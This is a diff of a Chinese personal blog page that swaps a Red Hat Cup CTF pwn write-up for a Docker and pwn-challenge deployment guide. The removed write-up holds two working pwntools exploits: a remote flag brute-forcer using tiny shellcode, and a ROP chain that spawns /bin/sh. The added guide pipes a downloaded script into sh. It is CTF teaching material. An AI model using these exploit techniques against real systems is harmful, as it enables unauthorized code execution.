@@ -86,22 +86,17 @@
 
 
 
-<meta name="description" content="pwn1程序静态链接，真恶心，呕。 首先分析程序流 main   catflag   maby is good   give me   该程序，第一个模块的函数读取了flag，写入bss段。第二个模块的函数又将bss段里的flag写入了堆里，并且将v1里的数据写入bss进行覆盖。第三个模块通过index定位，读取堆里的flag（读取1个字节）放入v2，mmap分配了一个带有执行权限的内存空间，而且">
+<meta name="description" content="正常的docker安装由于apt官方库里的docker版本可能比较旧，所以先卸载可能存在的旧版本： 1$ sudo apt-get remove docker docker-engine docker-ce docker.io  更新apt包索引： 1$ sudo apt-get update  安装以下包以使apt可以通过HTTPS使用存储库（repository）： 1$ sudo apt-g">
 <meta property="og:type" content="article">
-<meta property="og:title" content="红帽杯pwn wp">
-<meta property="og:url" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/index.html">
+<meta property="og:title" content="docker的搭建">
+<meta property="og:url" content="http://yoursite.com/2020/03/22/docker的搭建/index.html">
 <meta property="og:site_name" content="zhz&#39;blog">
-<meta property="og:description" content="pwn1程序静态链接，真恶心，呕。 首先分析程序流 main   catflag   maby is good   give me   该程序，第一个模块的函数读取了flag，写入bss段。第二个模块的函数又将bss段里的flag写入了堆里，并且将v1里的数据写入bss进行覆盖。第三个模块通过index定位，读取堆里的flag（读取1个字节）放入v2，mmap分配了一个带有执行权限的内存空间，而且">
+<meta property="og:description" content="正常的docker安装由于apt官方库里的docker版本可能比较旧，所以先卸载可能存在的旧版本： 1$ sudo apt-get remove docker docker-engine docker-ce docker.io  更新apt包索引： 1$ sudo apt-get update  安装以下包以使apt可以通过HTTPS使用存储库（repository）： 1$ sudo apt-g">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/image-20191111222819651.png">
-<meta property="og:image" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/image-20191111222903850.png">
-<meta property="og:image" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/image-20191111222943178.png">
-<meta property="og:image" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/image-20191111223104658.png">
-<meta property="og:updated_time" content="2019-11-12T09:30:26.046Z">
+<meta property="og:updated_time" content="2020-03-22T01:29:24.159Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="红帽杯pwn wp">
-<meta name="twitter:description" content="pwn1程序静态链接，真恶心，呕。 首先分析程序流 main   catflag   maby is good   give me   该程序，第一个模块的函数读取了flag，写入bss段。第二个模块的函数又将bss段里的flag写入了堆里，并且将v1里的数据写入bss进行覆盖。第三个模块通过index定位，读取堆里的flag（读取1个字节）放入v2，mmap分配了一个带有执行权限的内存空间，而且">
-<meta name="twitter:image" content="http://yoursite.com/2019/11/11/红帽杯pwn-wp/image-20191111222819651.png">
+<meta name="twitter:title" content="docker的搭建">
+<meta name="twitter:description" content="正常的docker安装由于apt官方库里的docker版本可能比较旧，所以先卸载可能存在的旧版本： 1$ sudo apt-get remove docker docker-engine docker-ce docker.io  更新apt包索引： 1$ sudo apt-get update  安装以下包以使apt可以通过HTTPS使用存储库（repository）： 1$ sudo apt-g">
 
 
 
@@ -131,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/11/11/红帽杯pwn-wp/">
+  <link rel="canonical" href="http://yoursite.com/2020/03/22/docker的搭建/">
 
 
 
 
 
-  <title>红帽杯pwn wp | zhz'blog</title>
+  <title>docker的搭建 | zhz'blog</title>
   
 
 
@@ -298,7 +293,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/11/红帽杯pwn-wp/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/22/docker的搭建/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="zhz">
@@ -315,7 +310,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">红帽杯pwn wp</h1>
+          <h1 class="post-title" itemprop="name headline">docker的搭建</h1>
         
 
         <div class="post-meta">
@@ -327,8 +322,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-11T22:18:51+08:00">
-                2019-11-11
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-22T09:00:05+08:00">
+                2020-03-22
               </time>
             
 
@@ -401,31 +396,81 @@
       
 
       
-        <h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>程序静态链接，真恶心，呕。</p>
-<p>首先分析程序流</p>
-<p>main</p>
-<img src="/2019/11/11/红帽杯pwn-wp/image-20191111222819651.png">
+        <h3 id="正常的docker安装"><a href="#正常的docker安装" class="headerlink" title="正常的docker安装"></a>正常的docker安装</h3><p>由于apt官方库里的docker版本可能比较旧，所以先卸载可能存在的旧版本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get remove docker docker-engine docker-ce docker.io</span><br></pre></td></tr></table></figure>
 
-<p>catflag</p>
-<img src="/2019/11/11/红帽杯pwn-wp/image-20191111222903850.png">
+<p>更新apt包索引：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure>
 
-<p>maby is good</p>
-<img src="/2019/11/11/红帽杯pwn-wp/image-20191111222943178.png">
+<p>安装以下包以使apt可以通过HTTPS使用存储库（repository）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure>
 
-<p>give me</p>
-<img src="/2019/11/11/红帽杯pwn-wp/image-20191111223104658.png">
+<p>添加Docker官方的GPG密钥：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>
 
-<p>该程序，第一个模块的函数读取了flag，写入bss段。第二个模块的函数又将bss段里的flag写入了堆里，并且将v1里的数据写入bss进行覆盖。第三个模块通过index定位，读取堆里的flag（读取1个字节）放入v2，mmap分配了一个带有执行权限的内存空间，而且可以往里面读3个字节，随后把这个mmap分配的内 存地址赋给一个函数指针，并且执行，在这里把它称为函数v3。</p>
-<p>红箭头指的就是关键地址，我们可以直接分析该模块的汇编。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [ebp+var_14]  //这里就是mov eax, v3</span><br><span class="line">call eax  //这就是关键点，执行v3</span><br></pre></td></tr></table></figure>
+<p>使用下面的命令来设置stable存储库：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo add-apt-repository <span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="variable">$(lsb_release -cs)</span> stable"</span></span><br></pre></td></tr></table></figure>
 
-<p>那么自然想到往里写入code，使得之后的赋值mov [ebp+var_10], eax （就是对v4赋值）中的eax可控。使得最后的比对可控，是我们控制的v4与flag中的数据进行比对，从而达到爆破的目的</p>
-<p>贴上exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#*!/usr/bin/python*</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#*-\*- coding:UTF-8 -**</span></span><br><span class="line"></span><br><span class="line">*<span class="keyword">from</span>* pwn *<span class="keyword">import</span>* *</span><br><span class="line"></span><br><span class="line">*<span class="keyword">import</span>* string</span><br><span class="line"></span><br><span class="line">*<span class="keyword">from</span>* time *<span class="keyword">import</span>* sleep</span><br><span class="line"></span><br><span class="line">\<span class="comment">#*context.log_level = 'debug'*</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> *<span class="title">Game</span>*<span class="params">(index,char)</span>:</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#  *cn = process('./pwn')*</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#  *gdb.attach(cn,'b \*0x08048C5B')*</span></span><br><span class="line"></span><br><span class="line">  cn = remote(<span class="string">'47.104.190.38'</span>,<span class="number">12001</span>)</span><br><span class="line"></span><br><span class="line">  shellcode = <span class="string">'RX\xc3'</span> //push edx ; pop eax ; ret</span><br><span class="line"></span><br><span class="line">  size = ord(char) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Give me a index:'</span>)</span><br><span class="line"></span><br><span class="line">  cn.sendline(str(index))</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Three is good number,I like it very much!'</span>)</span><br><span class="line"></span><br><span class="line">  cn.send(shellcode)</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Leave you name of size:'</span>)</span><br><span class="line"></span><br><span class="line">  cn.sendline(str(size))</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Tell me:\n'</span>)</span><br><span class="line"></span><br><span class="line">  cn.send((size<span class="number">-1</span>)*<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">  info = cn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">  *<span class="keyword">if</span>*(<span class="string">'2'</span> <span class="keyword">in</span> info):</span><br><span class="line"></span><br><span class="line">​    cn.close()</span><br><span class="line"></span><br><span class="line">​    *<span class="keyword">return</span>* <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">elif</span>*(<span class="string">'1'</span> <span class="keyword">in</span> info):</span><br><span class="line"></span><br><span class="line">​    print(char)</span><br><span class="line"></span><br><span class="line">​    cn.close()</span><br><span class="line"></span><br><span class="line">​    *<span class="keyword">return</span>* <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">else</span>*:</span><br><span class="line"></span><br><span class="line">​    cn.close()</span><br><span class="line"></span><br><span class="line">​    print(info)</span><br><span class="line"></span><br><span class="line">​    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">*<span class="keyword">if</span>* __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">  src = string.printable</span><br><span class="line"></span><br><span class="line">  flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">for</span>* i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line"></span><br><span class="line">​    *<span class="keyword">for</span>* j <span class="keyword">in</span> src:</span><br><span class="line"></span><br><span class="line">​      *<span class="keyword">if</span>* Game(i, j):</span><br><span class="line"></span><br><span class="line">​        flag += j</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">​        *<span class="keyword">if</span>* j == <span class="string">'&#125;'</span>:</span><br><span class="line"></span><br><span class="line">​          <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">​          exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">​        *<span class="keyword">break</span>*</span><br></pre></td></tr></table></figure>
+<p>再更新一下apt包索引：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure>
 
-<p>或者也可以利用最后的输入，提前写好code（xchg ecx, esp）进行rop</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span><span class="params">(signum=None, stack=None)</span>:</span></span><br><span class="line">    print(<span class="string">'Strip  all debugging information'</span>)</span><br><span class="line">    os.system(<span class="string">'rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script'</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sig <span class="keyword">in</span> [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: </span><br><span class="line">    signal.signal(sig, clear)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # Create a symbol file for GDB debugging</span></span><br><span class="line"><span class="comment"># try:</span></span><br><span class="line"><span class="comment">#     gdb_symbols = '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     f = open('/tmp/gdb_symbols.c', 'w')</span></span><br><span class="line"><span class="comment">#     f.write(gdb_symbols)</span></span><br><span class="line"><span class="comment">#     f.close()</span></span><br><span class="line"><span class="comment">#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')</span></span><br><span class="line"><span class="comment">#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')</span></span><br><span class="line"><span class="comment"># except Exception as e:</span></span><br><span class="line"><span class="comment">#     pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">execve_file = <span class="string">'./pwn'</span></span><br><span class="line"><span class="comment"># sh = process(execve_file, env=&#123;'LD_PRELOAD': '/tmp/gdb_symbols.so'&#125;)</span></span><br><span class="line">sh = process(execve_file)</span><br><span class="line"><span class="comment"># sh = remote('47.104.190.38', 12001)</span></span><br><span class="line">elf = ELF(execve_file)</span><br><span class="line"><span class="comment"># libc = ELF('./libc-2.27.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create temporary files for GDB debugging</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    gdbscript = <span class="string">'''</span></span><br><span class="line"><span class="string">    b *0x8048c5b</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    f = open(<span class="string">'/tmp/gdb_pid'</span>, <span class="string">'w'</span>)</span><br><span class="line">    f.write(str(proc.pidof(sh)[<span class="number">0</span>]))</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    f = open(<span class="string">'/tmp/gdb_script'</span>, <span class="string">'w'</span>)</span><br><span class="line">    f.write(gdbscript)</span><br><span class="line">    f.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'index:\n'</span>, str(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">xchg ecx, esp</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">sh.sendafter(<span class="string">' much!\n'</span>, payload)</span><br><span class="line">sh.sendlineafter(<span class="string">'size:\n'</span>, str(<span class="number">0x1ff</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">layout = [</span><br><span class="line">    <span class="number">0x08072fb1</span>, <span class="comment">#: pop edx; pop ecx; pop ebx; ret; </span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x80f6d40</span>,</span><br><span class="line">    <span class="number">0x080c11e6</span>, <span class="comment">#: pop eax; ret; </span></span><br><span class="line">    <span class="number">11</span>,</span><br><span class="line">    <span class="number">0x080738c0</span>, <span class="comment">#: int 0x80; ret; </span></span><br><span class="line">]</span><br><span class="line">sh.sendafter(<span class="string">'me:\n'</span>, flat(layout).ljust(<span class="number">0x80</span>, <span class="string">'\0'</span>) + <span class="string">'/bin/sh\0'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">clear()</span><br></pre></td></tr></table></figure>
+<p>安装最新版本的Docker CE：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install -y docker-ce</span><br></pre></td></tr></table></figure>
+
+<p>启动docker</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure>
+
+<p>用hello world进行验证是否成功启动</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>
+
+<h3 id="linux环境下pwn题的搭建"><a href="#linux环境下pwn题的搭建" class="headerlink" title="linux环境下pwn题的搭建"></a>linux环境下pwn题的搭建</h3><p>这里运用到pwn_deploy_chroot。</p>
+<p><a href="https://github.com/giantbranch/pwn_deploy_chroot" target="_blank" rel="noopener">https://github.com/giantbranch/pwn_deploy_chroot</a> &lt;–这里</p>
+<p>运用这个就可以不用上述繁琐操作，从零开始快速布置你的pwn题</p>
+<h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装docker</span></span><br><span class="line">curl ``-``s https:``/``/``get.docker.com``/` `| sh</span><br><span class="line"><span class="comment"># 安装 docker compose 和git</span></span><br><span class="line">apt install docker``-``compose git</span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line">git <span class="built_in">clone</span> https:``/``/``github.com``/``giantbranch``/``pwn_deploy_chroot.git</span><br></pre></td></tr></table></figure>
+
+<p>记得先给docker换源！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$vim</span> /etc/docker/daemon.json</span><br><span class="line"><span class="comment">#输入以下内容</span></span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line"><span class="string">"registry-mirrors"</span>: [<span class="string">"https://docker.mirrors.ustc.edu.cn"</span>] </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>更改镜像后重启docker</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#systemctl restart docker</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ol>
+<li>将所有pwn题目放入bin目录，可以1个，也可以n个（注意名字不带特殊字符，因为会将文件名作为linux用户名）</li>
+<li>python initialize.py</li>
+<li>docker-compose up –build -d</li>
+</ol>
+<h5 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h5><p>1.此时可能会在第三步因为dockerfile里面的设置问题，导致源没换成功。此时就手动修改dockerfile内容，加入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RUN  sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">RUN  apt-get clean</span><br><span class="line"></span><br><span class="line">RUN apt-get update</span><br></pre></td></tr></table></figure>
+
+<p>2.它会自动部署pwn题，端口默认从10000依次增加。<br>因为某xx要求端口是9999，所以我们要修改一下config.py,把这里的10000改成9999，然后把用的pwn放到bin里</p>
+<p>3.要想修改flag，就在第二步python initialize.py后修改flag.txt，再运行一次python initialize.py</p>
+<p>ok，此时pwn题已部署完毕。此时就可以到image去查看一番。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看当前运行的容器，找到对应的CONTAINER ID后进入</span></span><br><span class="line">sudo docker ps</span><br><span class="line">sudo docker <span class="built_in">exec</span> -ti &lt;CONTAINER ID&gt; bash</span><br></pre></td></tr></table></figure>
+
+<p>查看容器的ip,用nc连</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>最后就是用你的exp进行测试。</p>
+<h3 id="删除docker"><a href="#删除docker" class="headerlink" title="删除docker"></a>删除docker</h3><p>列出所有容器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<p>删除容器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm &lt;id|name&gt;</span><br></pre></td></tr></table></figure>
+
+<p>列出镜像</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
+
+<p>删除镜像</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi &lt;id|name&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="docker启动和停止"><a href="#docker启动和停止" class="headerlink" title="docker启动和停止"></a>docker启动和停止</h3><p>docker images中已经存在其镜像，对其启动</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run my/python:v1 cal <span class="comment">##my/python:v1为镜像名和标签</span></span><br></pre></td></tr></table></figure>
+
+<p>停止容器运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop <span class="variable">$CONTAINER_ID</span></span><br></pre></td></tr></table></figure>
+
+<p>开始容器运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start <span class="variable">$CONTAINER_ID</span></span><br></pre></td></tr></table></figure>
 
 
       
@@ -443,12 +488,12 @@
   <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
-  <p><span>本文标题:</span><a href="/2019/11/11/红帽杯pwn-wp/">红帽杯pwn wp</a></p>
+  <p><span>本文标题:</span><a href="/2020/03/22/docker的搭建/">docker的搭建</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 zhz 的个人博客">zhz</a></p>
-  <p><span>发布时间:</span>2019年11月11日 - 22:11</p>
-  <p><span>最后更新:</span>2019年11月12日 - 17:11</p>
-  <p><span>原始链接:</span><a href="/2019/11/11/红帽杯pwn-wp/" title="红帽杯pwn wp">http://yoursite.com/2019/11/11/红帽杯pwn-wp/</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2019/11/11/红帽杯pwn-wp/" aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2020年03月22日 - 09:03</p>
+  <p><span>最后更新:</span>2020年03月22日 - 09:03</p>
+  <p><span>原始链接:</span><a href="/2020/03/22/docker的搭建/" title="docker的搭建">http://yoursite.com/2020/03/22/docker的搭建/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2020/03/22/docker的搭建/" aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
 </div>
@@ -484,7 +529,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://yoursite.com/2019/11/11/红帽杯pwn-wp/" title="红帽杯pwn wp">http://yoursite.com/2019/11/11/红帽杯pwn-wp/</a>
+    <a href="http://yoursite.com/2020/03/22/docker的搭建/" title="docker的搭建">http://yoursite.com/2020/03/22/docker的搭建/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -506,8 +551,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/11/11/汇编笔记/" rel="next" title="汇编笔记">
-                <i class="fa fa-chevron-left"></i> 汇编笔记
+              <a href="/2020/03/10/格式化字符串解析/" rel="next" title="格式化字符串解析">
+                <i class="fa fa-chevron-left"></i> 格式化字符串解析
               </a>
             
           </div>
@@ -515,10 +560,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/11/18/linux系统调用表-system-call-table/" rel="prev" title="linux系统调用表(system call table)">
